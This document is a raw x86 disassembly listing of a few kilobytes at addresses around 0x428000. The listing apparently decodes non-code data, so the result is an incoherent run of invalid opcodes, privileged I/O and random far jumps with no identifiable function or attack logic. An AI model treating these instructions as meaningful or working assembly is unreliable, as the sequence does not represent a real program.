  42805d:	fs mov esp,0xafe36a18
  428063:	jno    0x428048
  428065:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  428066:	jnp    0x428050
  428068:	push   0x14da16f0
  42806d:	test   bl,dl
  42806f:	xor    DWORD PTR [ebx],ebx
  428071:	arpl   WORD PTR [ecx+0x8],bx
  428074:	sub    BYTE PTR [esi],dh
  428076:	and    BYTE PTR [eax+0x17be352b],0x5a
  42807d:	dec    DWORD PTR ds:0xe5594f21
  428083:	outs   dx,BYTE PTR ds:[esi]
  428084:	sub    BYTE PTR ds:0xe2254440,cl
  42808a:	int    0x2e
  42808c:	aas    
  42808d:	xor    DWORD PTR [eax-0x45109d2e],edi
  428093:	outs   dx,DWORD PTR ds:[esi]
  428094:	xchg   edi,eax
  428095:	mov    cl,0x26
  428097:	bound  edi,QWORD PTR [ecx]
  428099:	in     al,0xc7
  42809b:	mov    bh,0xb8
  42809d:	cmp    cl,BYTE PTR [ebp+ebx*1-0x54]
  4280a1:	das    
  4280a2:	call   0x5e32:0x8ec1bbc1
  4280a9:	mov    dl,0xb9
  4280ab:	mov    al,0x53
  4280ad:	mov    bl,0xa0
  4280af:	es cmp eax,0x58c1a0a1
  4280b5:	gs push ebx
  4280b7:	mov    gs,WORD PTR [edi+eiz*4]
  4280ba:	sub    eax,0xb137c887
  4280bf:	xor    DWORD PTR fs:[ecx-0x78116323],edi
  4280c6:	fwait
  4280c7:	and    eax,DWORD PTR [edx+0x12]
  4280ca:	sub    bh,BYTE PTR [edi+eiz*2]
  4280cd:	sub    ch,BYTE PTR [eax]
  4280cf:	sbb    ebx,DWORD PTR [eax+0x3053a857]
  4280d5:	lock adc dl,ah
  4280d8:	or     al,0x5a
  4280da:	popa   
  4280db:	(bad)  
  4280dc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4280dd:	mov    edx,0x90ae300a
  4280e2:	jae    0x4280c4
  4280e4:	sti    
  4280e5:	mov    ebx,0x234ac780
  4280ea:	xlat   BYTE PTR ds:[bx]
  4280ec:	push   edi
  4280ed:	adc    sp,WORD PTR [bx+si-0xe]
  4280f2:	and    ch,BYTE PTR [eax+0x38e29108]
  4280f8:	pop    edi
  4280f9:	shl    al,1
  4280fb:	or     dh,ah
  4280fd:	int3   
  4280fe:	jae    0x4280b2
  428100:	jg     0x42808b
  428102:	ret    0x50c0
  428105:	xchg   edx,ebx
  428107:	cs icebp 
  428109:	sbb    cl,BYTE PTR [ebp-0x3bae6e41]
  42810f:	aas    
	...
  428174:	fucomip st,st(6)
  428176:	std    
  428177:	dec    esp
  428178:	std    
  428179:	pop    edi
  42817a:	(bad)  
  42817b:	call   FWORD PTR [edx]
  42817d:	xchg   edi,eax
  42817e:	pop    esp
  42817f:	push   ecx
  428180:	mov    edx,0x381dec89
  428185:	lods   al,BYTE PTR ds:[esi]
  428186:	add    DWORD PTR [eax],eax
  428188:	add    al,0x1
  42818a:	add    BYTE PTR [eax],al
  42818c:	jge    0x4281fd
  42818e:	sbb    edx,DWORD PTR [ebp+0x27]
  428191:	sub    ebx,DWORD PTR [ebp+0x6]
  428194:	sub    DWORD PTR [esi+0xd],eax
  428197:	cmp    BYTE PTR [ecx],0x11
  42819a:	cs mov bh,0x16
  42819d:	int    0x5f
  42819f:	out    0x3c,eax
  4281a1:	dec    edx
  4281a2:	add    eax,0xa4d4d515
  4281a7:	gs fs mov ch,0xbb
  4281ab:	xor    ebp,esp
  4281ad:	mov    cs,WORD PTR [ecx+eiz*1-0x3c]
  4281b1:	out    0x2e,eax
  4281b3:	push   ebp
  4281b4:	inc    edi
  4281b5:	jbe    0x4281a9
  4281b7:	ss jge 0x42813a
  4281ba:	xlat   BYTE PTR ds:[ebx]
  4281bb:	jo     0x428165
  4281bd:	imul   ebp,DWORD PTR [eax+0x18eee421],0x763a7a1d
  4281c7:	cmp    ebx,DWORD PTR [edx]
  4281c9:	ficomp DWORD PTR [eax-0x58]
  4281cc:	add    esp,ecx
  4281ce:	mov    ah,BYTE PTR [ebp+eiz*1-0x33e75076]
  4281d5:	(bad)  
  4281d6:	jge    0x428228
  4281d8:	ror    DWORD PTR [ecx+0x55],1
  4281db:	dec    esi
  4281dc:	sbb    ah,BYTE PTR [esi-0x4a93cd62]
  4281e2:	aas    
  4281e3:	mov    edi,0x2fda9a0d
  4281e8:	and    BYTE PTR [ebx+esi*8-0x48d69638],0xca
  4281f0:	je     0x428176
  4281f2:	neg    BYTE PTR [edi+0x662ae2ab]
  4281f8:	pop    esp
  4281f9:	out    0x2,al
  4281fb:	addr16 mov eax,0x1346515
  428201:	retf   0x5d80
  428204:	call   0xe479:0x6c8cb463
  42820b:	xchg   BYTE PTR [edx+0x7a],al
  42820e:	(bad)  
  42820f:	push   ebx
  428210:	aad    0x88
  428212:	adc    esi,DWORD PTR [edi+0x5a]
  428215:	pop    edx
  428216:	fmul   DWORD PTR [esi+0x6d88768e]
  42821c:	inc    ebp
  42821d:	cmp    al,bl
  42821f:	sbb    ah,dl
  428221:	clc    
  428222:	mov    ecx,0x570b3105
  428227:	cli    
  428228:	enter  0x3667,0x45
  42822c:	lea    ebx,[esi-0x132e7e09]
  428232:	inc    eax
  428233:	sub    al,0xb9
  428235:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  428236:	ret    
  428237:	repnz int3 
  428239:	xchg   DWORD PTR [edx+0x50],ebx
  42823c:	add    BYTE PTR [eax+0x5ee3acfe],cl
  428242:	adc    DWORD PTR [ebx-0x463bed27],edx
  428248:	lea    esi,[edx-0x4e77439a]
  42824e:	fwait
  42824f:	jg     0x428254
  428251:	js     0x42822a
  428253:	xlat   BYTE PTR ds:[ebx]
  428254:	inc    esi
  428255:	dec    ecx
  428256:	xor    bh,BYTE PTR [edx]
  428258:	or     BYTE PTR [eax-0x5f],0x5e
  42825c:	mov    esi,0x5db87345
  428261:	pop    ecx
  428262:	xor    ecx,edx
  428264:	(bad)  
  428265:	or     ecx,DWORD PTR [ecx-0x4d]
  428268:	xchg   DWORD PTR [esi+ebx*8],esp
  42826b:	fadd   QWORD PTR [edi]
  42826d:	sbb    al,0x50
  42826f:	jge    0x42825a
  428271:	jmp    0xd9a8:0xfd08356b
  428278:	dec    edi
  428279:	xchg   edi,eax
  42827a:	adc    DWORD PTR [eax],ecx
  42827c:	sti    
  42827d:	xor    DWORD PTR [ebx],ebp
  42827f:	out    dx,al
  428280:	push   0xffffffb9
  428282:	and    esp,esi
  428284:	mov    DWORD PTR [edx-0x5f],esi
  428287:	adc    eax,0x69ba96ef
  42828c:	xchg   BYTE PTR [ebx+0x15],al
  42828f:	and    BYTE PTR [eax],al
	...
  4282f1:	add    BYTE PTR [eax],al
  4282f3:	add    bh,al
  4282f5:	fidiv  WORD PTR [esi]
  4282f7:	loop   0x428338
  4282f9:	jmp    0x5c37:0x7b70ffd7
  428300:	xor    bl,BYTE PTR [edi+0x5e]
  428303:	sar    BYTE PTR [ebp*4+0x1040001],1
  42830a:	add    BYTE PTR [eax],al
  42830c:	inc    eax
  42830d:	ins    DWORD PTR es:[edi],dx
  42830e:	leave  
  42830f:	jmp    DWORD PTR [esi]
  428311:	sbb    BYTE PTR [esi+esi*8],cl
  428314:	retf   0xdc84
  428317:	push   ecx
  428318:	or     BYTE PTR [ebp-0x9c06bd0],bh
  42831e:	cld    
  42831f:	mov    bl,0x61
  428321:	add    eax,0x41cb3b95
  428326:	(bad)  
  428327:	in     al,0xd8
  428329:	lea    ecx,[edx]
  42832b:	test   al,0x51
  42832d:	addr16 and eax,0xb073077e
  428333:	ja     0x42838e
  428335:	add    bh,BYTE PTR [edi]
  428337:	add    DWORD PTR [esp+edx*4],ecx
  42833a:	rol    WORD PTR [ebx+0x55],cl
  42833e:	add    al,0x33
  428340:	js     0x42836c
  428342:	neg    BYTE PTR [ebx+0x1f]
  428345:	leave  
  428346:	inc    edi
  428347:	add    eax,0xc9826565
  42834c:	or     BYTE PTR [edi+0x2e],cl
  42834f:	push   ebx
  428350:	and    esi,DWORD PTR [ebx]
  428352:	cs mov bl,0xe4
  428355:	mov    al,0x8f
  428357:	sbb    ebp,0x65
  42835a:	pop    esp
  42835b:	stc    
  42835c:	mov    edi,0x6e5f2854
  428361:	push   edx
  428362:	xchg   esi,eax
  428363:	js     0x4283d2
  428365:	retf   
  428366:	into   
  428367:	sbb    ecx,ecx
  428369:	in     al,0xcf
  42836b:	mov    esp,esp
  42836d:	mov    bh,0xc6
  42836f:	mov    cl,0xd1
  428371:	sbb    edi,DWORD PTR [edx+0xc1cf07e]
  428377:	cmp    DWORD PTR [ebx],eax
  428379:	cdq    
  42837a:	inc    ebx
  42837b:	pop    edx
  42837c:	add    cl,BYTE PTR [ebp-0x30]
  42837f:	enter  0x78a1,0x83
  428383:	(bad)  
  428384:	in     al,0xe6
  428386:	not    BYTE PTR [ebp+0x3943da75]
  42838c:	and    BYTE PTR [eax-0x18],0xf7
  428390:	push   edx
  428391:	test   BYTE PTR [edx-0x4ec2f04e],0x6a
  428398:	adc    ecx,DWORD PTR [esi]
  42839a:	outs   dx,DWORD PTR ds:[esi]
  42839b:	test   DWORD PTR [edi+eax*4+0x18a261dd],edx
  4283a2:	jmp    0x4283d1
  4283a4:	call   0xbf8802b
  4283a9:	sbb    bl,ch
  4283ab:	retf   0x8db6
  4283ae:	cmc    
  4283af:	xor    dh,al
  4283b1:	xchg   ebx,eax
  4283b2:	jmp    DWORD PTR [esi-0x24]
  4283b5:	jl     0x428423
  4283b7:	xchg   edx,eax
  4283b8:	cmp    ch,bh
  4283ba:	fnstsw WORD PTR [ecx-0x6bfa49e2]
  4283c0:	out    0x0,al
  4283c2:	pop    esi
  4283c3:	cmp    al,0xfa
  4283c5:	and    esi,DWORD PTR ss:[ebp-0x58]
  4283c9:	fcom   QWORD PTR gs:[esi+ecx*4-0x1d]
  4283ce:	push   ebx
  4283cf:	cmp    edx,DWORD PTR [edx+0x655ab8ad]
  4283d5:	and    bh,ah
  4283d7:	pop    ss
  4283d8:	pop    ds
  4283d9:	or     dh,BYTE PTR [eax-0x6be8c568]
  4283df:	pop    eax
  4283e0:	fisubr DWORD PTR [edx]
  4283e2:	mov    eax,0x38cdd132
  4283e7:	ss scas al,BYTE PTR es:[edi]
  4283e9:	imul   eax,edx,0xffffffbb
  4283ec:	iret   
  4283ed:	data16 lods al,BYTE PTR ds:[esi]
  4283ef:	ja     0x428431
  4283f1:	jne    0x4283f9
  4283f3:	mov    ds:0xe3df0150,al
  4283f8:	sbb    DWORD PTR [ecx],ebp
  4283fa:	xor    DWORD PTR [edx+0x5d],0xffffff92
  4283fe:	pop    eax
  4283ff:	mov    esp,0xded6c040
  428404:	sbb    BYTE PTR [ebx+0x7e771e61],0xe
  42840b:	out    dx,al
  42840c:	or     ah,ch
  42840e:	cmp    eax,0xfa
	...
  428473:	add    BYTE PTR [esi],cl
  428475:	xchg   esp,eax
  428476:	jg     0x4284db
  428478:	(bad)  
  428479:	jmp    0x428499
  42847b:	std    
  42847c:	mov    edi,0xccabfb32
  428481:	mov    WORD PTR [ebx],?
  428483:	pushf  
  428484:	inc    eax
  428485:	scas   al,BYTE PTR es:[edi]
  428486:	add    DWORD PTR [eax],eax
  428488:	add    al,0x1
  42848a:	add    BYTE PTR [eax],al
  42848c:	mov    bl,0xd3
  42848e:	add    dl,BYTE PTR [ecx+eiz*8]
  428491:	inc    esi
  428492:	mov    edi,ebx
  428494:	jg     0x4284dc
  428496:	dec    eax
  428497:	inc    ebp
  428498:	mov    dl,0x91
  42849a:	repnz push edi
  42849c:	sub    esi,ecx
  42849e:	ja     0x428460
  4284a0:	adc    BYTE PTR [eax+esi*2],ah
  4284a3:	and    al,0x38
  4284a5:	sub    esp,esi
  4284a7:	pop    eax
  4284a8:	pop    edi
  4284a9:	dec    ecx
  4284aa:	xor    eax,0xe858ebb1
  4284af:	shl    DWORD PTR [edi-0x498a1614],1
  4284b5:	cmp    ecx,0xffffff87
  4284b8:	aad    0x83
  4284ba:	jbe    0x42850d
  4284bc:	sub    DWORD PTR [ebp-0x322f641e],0x13
  4284c3:	add    esi,DWORD PTR [bp+si+0x1dbc]
  4284c8:	adc    eax,0xad2d1a76
  4284cd:	mov    edi,ebx
  4284cf:	fldenv [ebp+0x43cbc6fa]
  4284d5:	xchg   DWORD PTR [ebp-0x1a],edi
  4284d8:	and    edx,DWORD PTR [esi-0x13]
  4284db:	lods   eax,DWORD PTR ds:[esi]
  4284dc:	lahf   
  4284dd:	jb     0x428523
  4284df:	iret   
  4284e0:	sbb    eax,0xb27c50f3
  4284e5:	rcr    cl,1
  4284e7:	fnstsw WORD PTR [ecx+0x5e6da09d]
  4284ed:	cld    
  4284ee:	popf   
  4284ef:	(bad)  
  4284f0:	ror    DWORD PTR [edx+0xb],0xe8
  4284f4:	mov    eax,DWORD PTR [eax+0x1aeb1335]
  4284fa:	jge    0x428502
  4284fc:	mov    bl,0xbf
  4284fe:	das    
  4284ff:	cmp    DWORD PTR [ebp-0x1867bf37],0x59401504
  428509:	fdivr  st,st(4)
  42850b:	adc    BYTE PTR [eax],0xcc
  42850e:	xor    dl,ah
  428510:	cli    
  428511:	adc    cl,BYTE PTR [ebx]
  428513:	push   ss
  428514:	pushf  
  428515:	cmp    DWORD PTR [edi-0x4e19013d],esi
  42851b:	icebp  
  42851c:	ror    BYTE PTR [eax+0x2d],0xb4
  428520:	scas   al,BYTE PTR es:[edi]
  428521:	mov    ebp,0xcff36ee2
  428526:	mov    esi,DWORD PTR [ebp+0x661534ed]
  42852c:	nop
  42852d:	gs aas 
  42852f:	test   DWORD PTR [ebx+0xceeb192],edi
  428535:	mov    cl,BYTE PTR [ecx-0x71]
  428538:	jle    0x4284be
  42853a:	stos   DWORD PTR es:[edi],eax
  42853b:	in     al,0x5a
  42853d:	adc    DWORD PTR [edi],esi
  42853f:	xchg   esi,eax
  428540:	jmp    0x2083:0x806aae3e
  428547:	ds xor ebx,esi
  42854a:	je     0x4284ff
  42854c:	out    0x29,al
  42854e:	mov    ch,0xff
  428550:	push   esi
  428551:	outs   dx,DWORD PTR ds:[esi]
  428552:	push   0xffffffe2
  428554:	int    0x94
  428556:	mov    ebp,0x3975adfc
  42855b:	je     0x428508
  42855d:	stc    
  42855e:	mov    ah,0xd5
  428560:	xchg   ecx,eax
  428561:	iret   
  428562:	aad    0xf2
  428564:	and    BYTE PTR [ebp-0xe7ec0fe],cl
  42856a:	pop    eax
  42856b:	sub    DWORD PTR [ebx+ecx*2-0x55],ecx
  42856f:	in     al,dx
  428570:	mov    edi,esp
  428572:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  428573:	fwait
  428574:	cmp    ebx,ebx
  428576:	add    DWORD PTR [ebx+ebx*4],ecx
  428579:	mov    ch,BYTE PTR [eax-0x71]
  42857c:	jb     0x42855e
  42857e:	repz jns 0x4285e1
  428581:	lds    edx,FWORD PTR [esi]
  428583:	mov    dl,0x87
  428585:	out    dx,eax
  428586:	in     eax,0x18
  428588:	jp     0x428536
  42858a:	xor    al,0x11
  42858c:	adc    eax,0x4fac62
	...
  4285f1:	add    BYTE PTR [eax],al
  4285f3:	add    BYTE PTR [ecx-0xa],dl
  4285f6:	xor    eax,0x5bffb73e
  4285fb:	inc    edi
  4285fd:	mov    esi,0xb99ba3f6
  428602:	int    0x89
  428604:	inc    esp
  428605:	scas   eax,DWORD PTR es:[edi]
  428606:	add    DWORD PTR [eax],eax
  428608:	add    al,0x1
  42860a:	add    BYTE PTR [eax],al
  42860c:	sti    
  42860d:	(bad)  
  42860e:	xchg   edi,eax
  42860f:	lock stc 
  428611:	icebp  
  428612:	imul   ecx,DWORD PTR [ecx],0xaa28ccd0
  428618:	add    al,dl
  42861a:	jecxz  0x42869a
  42861c:	push   cs
  42861d:	aaa    
  42861e:	test   al,0xd4
  428620:	lock ret 0x9474
  428624:	sub    bh,BYTE PTR [ebp+0x39]
  428627:	mov    al,ds:0x304b9c8c
  42862c:	push   ebx
  42862d:	(bad)  
  42862e:	out    0x5c,eax
  428630:	sti    
  428631:	clc    
  428632:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  428633:	das    
  428634:	jnp    0x4286af
  428636:	push   es
  428637:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  428638:	or     ah,BYTE PTR [eax-0x4c]
  42863b:	cdq    
  42863c:	pop    ss
  42863d:	sub    edx,DWORD PTR [ebp-0x7]
  428640:	mov    cl,0x2c
  428642:	arpl   WORD PTR [ebp+0x4],bx
  428645:	xchg   bl,ch
  428647:	cld    
  428648:	retf   
  428649:	cs push es
  42864b:	dec    esp
  42864c:	loope  0x428603
  42864e:	and    al,0x94
  428650:	and    al,0x66
  428652:	inc    ebx
  428653:	movs   DWORD PTR es:[edi],DWORD PTR fs:[esi]
  428655:	sub    BYTE PTR [edi-0x6458e859],al
  42865b:	in     eax,0xc1
  42865d:	push   edi
  42865e:	pop    ecx
  42865f:	stos   DWORD PTR es:[edi],eax
  428660:	xor    bl,al
  428662:	sti    
  428663:	xchg   ebp,eax
  428664:	push   esp
  428665:	call   0xfb582c65
  42866a:	fstp   QWORD PTR [esi+eax*2]
  42866d:	jp     0x4286ab
  42866f:	test   al,0x6
  428671:	mov    ds:0x4bfbf9f9,eax
  428676:	or     ch,bh
  428678:	icebp  
  428679:	dec    eax
  42867a:	dec    eax
  42867b:	or     ebp,DWORD PTR [edi+0x40]
  42867e:	fmulp  st(1),st
  428680:	inc    esp
  428681:	enter  0x8cf0,0x59
  428685:	in     eax,dx
  428686:	mov    ch,BYTE PTR [edi+0x7f]
  428689:	(bad)  
  42868a:	push   edi
  42868b:	mov    bh,0xb6
  42868d:	dec    esp
  42868e:	lock in al,0xd0
  428691:	iret   
  428692:	mov    BYTE PTR [ebx],bl
  428694:	mov    ?,WORD PTR [eax+0x5eb26d6c]
  42869a:	xchg   esp,eax
  42869b:	xchg   edi,eax
  42869c:	clc    
  42869d:	rcr    esp,0x9e
  4286a0:	xchg   edx,eax
  4286a1:	(bad)  
  4286a2:	scas   eax,DWORD PTR es:[edi]
  4286a3:	mov    ds:0x98c833d2,al
  4286a8:	js     0x428660
  4286aa:	mov    fs,WORD PTR [ebx+0x7e44fa12]
  4286b0:	cmp    DWORD PTR ss:[esi-0x3c912d50],eax
  4286b7:	or     eax,0x1f38c189
  4286bc:	sub    cl,dl
  4286be:	iret   
  4286bf:	(bad)  
  4286c0:	jne    0x42873c
  4286c2:	fst    QWORD PTR [eax-0x36307a0f]
  4286c8:	scas   eax,DWORD PTR es:[edi]
  4286c9:	sbb    DWORD PTR [ecx],edi
  4286cb:	fst    QWORD PTR [ebp+0xc]
  4286ce:	xor    BYTE PTR [ecx-0xc],ah
  4286d1:	lock inc esp
  4286d3:	retf   0xbf54
  4286d6:	jl     0x428707
  4286d8:	sbb    eax,eax
  4286da:	mov    es,WORD PTR [esi-0x2d75786e]
  4286e0:	fs cwde 
  4286e2:	cmp    ecx,DWORD PTR [esp+eiz*2]
  4286e5:	sub    eax,0x651e2a48
  4286ea:	mov    eax,DWORD PTR [ebx+0x3b]
  4286ed:	jge    0x428682
  4286ef:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4286f0:	push   ss
  4286f1:	int    0xd4
  4286f3:	push   es
  4286f4:	xchg   DWORD PTR [edx],ecx
  4286f6:	cmp    bh,BYTE PTR [ebx+eiz*1-0x2f2e3ce5]
  4286fd:	js     0x428739
  4286ff:	popa   
  428700:	icebp  
  428701:	cld    
  428702:	jmp    0xe857c9c1
  428707:	in     al,0xd7
  428709:	push   es
  42870a:	(bad)  
  42870b:	jae    0x4286c3
  42870d:	xor    eax,0xf55d
	...
  428772:	add    BYTE PTR [eax],al
  428774:	push   esi
  428775:	pop    ebx
  428776:	xor    al,0x78
  428778:	cmp    eax,0xe77f5e7f
  42877d:	inc    ebp
  42877e:	call   0x57a5e996
  428783:	push   ss
  428784:	dec    eax
  428785:	mov    al,0x1
  428787:	add    BYTE PTR [ecx+eax*1],al
  42878a:	add    BYTE PTR [eax],al
  42878c:	addr16 inc edx
  42878e:	push   eax
  42878f:	out    0xe6,eax
  428791:	unpckhps xmm4,XMMWORD PTR [ebx+ebp*2]
  428795:	lods   al,BYTE PTR ds:[esi]
  428796:	adc    al,0x1c
  428798:	in     al,dx
  428799:	cmp    eax,0x846ae220
  42879e:	mov    edx,0xb135afaf
  4287a3:	and    edx,DWORD PTR [edx+0x40]
  4287a6:	sub    eax,DWORD PTR [ecx]
  4287a8:	lds    esi,FWORD PTR gs:[esi+0x5085def8]
  4287af:	call   0x6f21:0xecc5c93b
  4287b6:	dec    edi
  4287b7:	push   eax
  4287b8:	stos   DWORD PTR es:[edi],eax
  4287b9:	push   ebp
  4287ba:	mov    ch,0x17
  4287bc:	fstp   TBYTE PTR [ebp-0x1bf11c67]
  4287c2:	shl    DWORD PTR [ebx+edx*1],0xc2
  4287c6:	mov    bh,0x6f
  4287c8:	mov    esi,0xbef36fdb
  4287cd:	aam    0xc3
  4287cf:	jl     0x4287c3
  4287d1:	sbb    esi,DWORD PTR ds:0x7bded40c
  4287d7:	jecxz  0x42883f
  4287d9:	push   esi
  4287da:	mov    BYTE PTR [ecx],ah
  4287dc:	and    BYTE PTR ds:0x7f39bde5,dl
  4287e2:	add    al,0x78
  4287e4:	add    DWORD PTR [eax-0x80],eax
  4287e7:	fst    DWORD PTR [ebx+esi*1]
  4287ea:	in     al,dx
  4287eb:	scas   al,BYTE PTR es:[edi]
  4287ec:	clc    
  4287ed:	ffree  st(4)
  4287ef:	stos   BYTE PTR es:[edi],al
  4287f0:	or     bl,al
  4287f2:	std    
  4287f3:	dec    esp
  4287f4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4287f5:	out    0x5e,eax
  4287f7:	mov    ds:0x48e80f94,al
  4287fc:	loope  0x4287e5
  4287fe:	sub    DWORD PTR [ecx-0x362dfd80],edx
  428804:	mov    ch,0xb6
  428806:	jle    0x4287d7
  428808:	out    dx,al
  428809:	test   esp,ecx
  42880b:	nop
  42880c:	dec    ecx
  42880d:	iret   
  42880e:	hlt    
  42880f:	sub    ecx,DWORD PTR [edi-0x300a9e6f]
  428815:	mov    edi,0x7b7bd638
  42881a:	and    BYTE PTR [eax+edx*8+0x509949ab],bh
  428821:	fisubr DWORD PTR es:[eax]
  428824:	and    esi,DWORD PTR [esi-0x65]
  428827:	and    DWORD PTR [ebp-0x45],esi
  42882a:	sub    al,0xbb
  42882c:	mov    cl,0x18
  42882e:	popf   
  42882f:	xor    DWORD PTR [edi+0x259b4b34],edi
  428835:	and    cl,dl
  428837:	push   eax
  428838:	rcr    edx,1
  42883a:	dec    esi
  42883b:	push   es
  42883c:	outs   dx,BYTE PTR ds:[esi]
  42883d:	loop   0x4287cb
  42883f:	adc    ebx,DWORD PTR [eax+0x9]
  428842:	loop   0x4287f3
  428844:	icebp  
  428845:	pushf  
  428846:	retf   
  428847:	mov    dh,0x25
  428849:	mov    edx,0xab5fe10e
  42884e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42884f:	leave  
  428850:	enter  0xef29,0x14
  428854:	mov    ebp,0x7f536011
  428859:	jmp    0xca9305ee
  42885e:	outs   dx,DWORD PTR ds:[esi]
  42885f:	cs sbb al,0x76
  428862:	jb     0x4287ec
  428864:	mov    bl,0x95
  428866:	fwait
  428867:	pop    ebx
  428868:	pop    ebx
  428869:	cmp    eax,ecx
  42886b:	int3   
  42886c:	xor    DWORD PTR [ebx+0x54],edi
  42886f:	fidivr DWORD PTR [ebp-0x3e]
  428872:	jne    0x42884a
  428874:	mov    ds,edx
  428876:	jns    0x428886
  428878:	pop    ss
  428879:	dec    esi
  42887a:	iret   
  42887b:	and    edi,DWORD PTR [edi+0x25]
  42887e:	outs   dx,DWORD PTR ds:[esi]
  42887f:	stc    
  428880:	fucomip st,st(1)
  428882:	outs   dx,BYTE PTR ds:[esi]
  428883:	fwait
  428884:	xor    dl,ah
  428886:	repnz lods al,BYTE PTR ds:[si]
  428889:	mov    dl,0x66
  42888b:	lea    ecx,[ecx+0xbba607]
	...
  4288f1:	add    BYTE PTR [eax],al
  4288f3:	add    BYTE PTR [esi],ah
  4288f5:	jp     0x428968
  4288f7:	les    edi,FWORD PTR [ebp-0x31]
  4288fa:	mov    bh,0xfa
  4288fc:	arpl   WORD PTR [esi+0x673b9d0f],bx
  428902:	add    eax,0x1b14c2b
  428907:	add    BYTE PTR [ecx+eax*1],al
  42890a:	add    BYTE PTR [eax],al
  42890c:	pop    ds
  42890d:	lock dec ecx
  42890f:	(bad)  
  428910:	push   ebx
  428911:	iret   
  428912:	sbb    edi,DWORD PTR [eax-0x18]
  428915:	jnp    0x428943
  428917:	cmp    esp,DWORD PTR [esi]
  428919:	xchg   edx,eax
  42891a:	fs and esi,eax
  42891d:	rcl    dl,1
  42891f:	push   0x9b502e9b
  428924:	out    0x29,eax
  428926:	out    dx,eax
  428927:	ficomp DWORD PTR [ebp+0x746309bc]
  42892d:	sub    eax,0xc9625d03
  428932:	popf   
  428933:	push   ds
  428934:	push   ebx
  428935:	imul   esp,DWORD PTR [edx],0x60
  428938:	mov    cl,0xd0
  42893a:	push   edi
  42893b:	adc    DWORD PTR [ecx-0x29c3529c],ebp
  428941:	dec    ebx
  428942:	sar    DWORD PTR [eax-0x6c],0x1f
  428946:	ja     0x428934
  428948:	cmp    dl,cl
  42894a:	ret    0xc919
  42894d:	nop
  42894e:	loope  0x428982
  428950:	fdiv   QWORD PTR [edx-0x37]
  428953:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  428954:	inc    DWORD PTR [ecx+0x48]
  428957:	jno    0x4289cb
  428959:	fucomp st(4)
  42895b:	fs jae 0x4288f3
  42895e:	jbe    0x428918
  428960:	bound  edi,QWORD PTR [esi]
  428962:	test   eax,0xf528854a
  428967:	push   es
  428968:	adc    BYTE PTR [edi+0x5d],bh
  42896b:	sbb    DWORD PTR [edx+0x5f374e8c],edi
  428971:	(bad)  
  428972:	inc    esi
  428973:	nop
  428974:	in     al,dx
  428975:	fld    DWORD PTR [eax-0x541d220d]
  42897b:	and    ecx,ebp
  42897d:	add    DWORD PTR ds:0x3188cd2e,ecx
  428983:	cmp    eax,DWORD PTR [eax+0x6b7f1421]
  428989:	stos   BYTE PTR es:[edi],al
  42898a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42898b:	dec    edx
  42898c:	fst    QWORD PTR [esi]
  42898e:	in     eax,0xc7
  428990:	pop    esp
  428991:	(bad)  
  428992:	arpl   WORD PTR [ecx-0x73],si
  428995:	test   DWORD PTR [edx],0x3ec50c0b
  42899b:	jo     0x428a09
  42899d:	loopne 0x4289d9
  42899f:	mov    dh,0xeb
  4289a1:	sub    dh,BYTE PTR [edi+eax*8-0x481bb1c1]
  4289a8:	lds    edi,FWORD PTR [ebx]
  4289aa:	sti    
  4289ab:	xchg   esp,eax
  4289ac:	add    ah,ah
  4289ae:	in     al,0x61
  4289b0:	pop    ss
  4289b1:	loope  0x428a06
  4289b3:	imul   esp,DWORD PTR [edi],0xffffff97
  4289b6:	push   es
  4289b7:	jecxz  0x428949
  4289b9:	neg    BYTE PTR cs:[eax-0x5e]
  4289bd:	pop    edx
  4289be:	imul   edx
  4289c0:	popf   
  4289c1:	or     al,0x80
  4289c3:	ds push esi
  4289c5:	int    0xa1
  4289c7:	cmp    DWORD PTR [edx-0x18],esi
  4289ca:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4289cb:	mov    eax,0x2c7bb32
  4289d0:	ret    
  4289d1:	call   0xaa2c0948
  4289d6:	jg     0x428966
  4289d8:	inc    ebx
  4289d9:	ds inc edi
  4289db:	jno    0x428a06
  4289dd:	dec    edx
  4289de:	out    0x89,al
  4289e0:	dec    ebp
  4289e1:	retf   
  4289e2:	fdivr  DWORD PTR ds:0xabe6ad39
  4289e8:	sbb    eax,0x33f450d4
  4289ed:	mov    bl,0x93
  4289ef:	cmp    al,0xdd
  4289f1:	outs   dx,DWORD PTR ds:[esi]
  4289f2:	inc    edx
  4289f3:	inc    ebp
  4289f4:	mov    eax,0x68cca073
  4289f9:	mov    WORD PTR [ecx-0x2e7158c9],ds
  4289ff:	push   edx
  428a00:	push   0x733fd8d0
  428a05:	pop    es
  428a06:	and    BYTE PTR [ecx+esi*1+0x3],ch
  428a0a:	fisttp WORD PTR [edi+ecx*8]
  428a0d:	sub    cl,BYTE PTR ds:0x49
	...
  428a73:	add    BYTE PTR [ebp+0xc],cl
  428a76:	clc    
  428a77:	pop    ebx
  428a78:	stc    
  428a79:	(bad)  
  428a7a:	out    dx,eax
  428a7b:	push   ds
  428a7c:	pop    ds
  428a7d:	bound  edx,QWORD PTR [eax+0x4fc22813]
  428a83:	loop   0x428ad5
  428a85:	mov    dl,0x1
  428a87:	add    BYTE PTR [ecx+eax*1],al
  428a8a:	add    BYTE PTR [eax],al
  428a8c:	fiadd  DWORD PTR [ebp+0x518a8363]
  428a92:	nop
  428a93:	mov    ds:0xcecfd72d,al
  428a98:	in     eax,0xcd
  428a9a:	leave  
  428a9b:	ins    DWORD PTR es:[edi],dx
  428a9c:	and    dh,BYTE PTR [ebx+0x2bc5cf13]
  428aa2:	scas   eax,DWORD PTR es:[edi]
  428aa3:	or     bh,cl
  428aa5:	pop    ebp
  428aa6:	xchg   esp,eax
  428aa7:	xchg   edx,eax
  428aa8:	imul   ebp,DWORD PTR [edi+ebx*1+0x6],0x14
  428aad:	dec    edi
  428aae:	pop    edx
  428aaf:	loopne 0x428aff
  428ab1:	mov    al,0xa7
  428ab3:	and    DWORD PTR [ecx+0x26],ebx
  428ab6:	mov    ecx,0x9bf1ccdd
